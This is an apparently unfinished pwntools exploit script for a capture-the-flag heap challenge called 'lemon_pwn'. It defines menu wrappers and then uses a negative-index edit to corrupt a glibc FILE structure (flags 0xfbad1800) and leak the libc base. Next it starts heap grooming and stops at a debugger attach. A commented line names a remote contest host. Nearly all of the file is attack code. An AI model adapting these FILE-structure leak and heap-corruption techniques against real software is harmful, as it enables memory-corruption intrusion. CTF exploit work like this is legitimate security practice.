from pwn import *
from rpyc import lib

context(os = 'linux', arch = 'amd64', log_level = 'debug')
io = process('lemon_pwn')
# io = remote('47.104.70.90', 25315)
libc = ELF('/home/payoung/Downloads/glibc-all-in-one/libs/2.26-0ubuntu2_amd64/libc-2.26.so')
# libc = ELF('libc-2.26.so')
elf = ELF('lemon_pwn')


def add(index, name, size, message):
    io.sendlineafter('your choice >>> ', '1')
    io.sendlineafter('Input the index of your lemon: ', str(index))
    io.sendafter('Now, name your lemon: ', name)
    io.sendlineafter('Input the length of message for you lemon: ', str(size))
    if size <= 0x400:
        io.sendafter('Leave your message: ', message)


def show(index):
    io.sendlineafter('your choice >>> ', '2')
    io.sendlineafter('Input the index of your lemon : ', str(index))
    io.recvuntil('eat eat eat ')
    return int(io.recvuntil('...\n', drop=True), 16)


def delete(index):
    io.sendlineafter('your choice >>> ', '3')
    io.sendlineafter('Input the index of your lemon : ', str(index))


def edit(index, payload):
    io.sendlineafter('your choice >>> ', '4')
    io.sendlineafter('Input the index of your lemon  : ', str(index))
    io.sendafter('Now it\'s your time to draw and color!', payload)


def game():
    io.sendlineafter('Do you wanner play a guess-lemon-color game with me?\n', 'yes')
    io.sendafter('Give me your lucky number: \n', '12345678')
    io.sendlineafter('tell me you name first: \n', 'aaaa')


def leak():
    global libc_base
    payload = p64(0xfbad1800) + p64(1) * 3 + b'\x18'
    edit(-268, payload)
    libc_base = u64(io.recvuntil(b'\x7f\x00\x00')[-8:]) - libc.sym['_IO_file_jumps']
    log.success('libc_base: ' + hex(libc_base))
    '''add(0, 'aaaa', 0x88, 'aaaa')
    add(1, 'fake', 0x1000, 'aaaa')
    delete(0)
    fake_chunk = libc_base + libc.sym['_IO_2_1_stderr_'] + 0xad
    payload = b'a' * 16 + p32(0x20) + p32(1) + p64(fake_chunk)
    add(0, 'aaaa', 0x20, payload)'''
    add(0, 'fake', 0x1000, 'aaaa')
    add(1, 'aaaa', 0x88, 'aaaa')
    gdb.attach(io)
    delete(1)
    
    pause()


if __name__ == '__main__':
    game()
    leak()

